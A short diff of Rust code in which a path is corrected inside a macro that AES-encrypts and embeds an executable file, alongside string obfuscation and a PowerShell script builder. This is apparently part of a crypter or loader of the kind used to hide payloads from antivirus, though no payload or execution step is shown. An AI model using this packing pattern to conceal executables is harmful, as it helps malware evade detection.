@@ -5,7 +5,7 @@ use obfstr::obfstr;
 use powershell_script::PsScriptBuilder;
 
 fn xref() -> &'static EncryptedFile {
-    static FILE: EncryptedFile = include_crypt!(AES,"C:\\Users\\\\Desktop\\File.exe");
+    static FILE: EncryptedFile = include_crypt!(AES,"C:\\Users\\Desktop\\File.exe");
     obfstr::xref!(&FILE)
 }
 
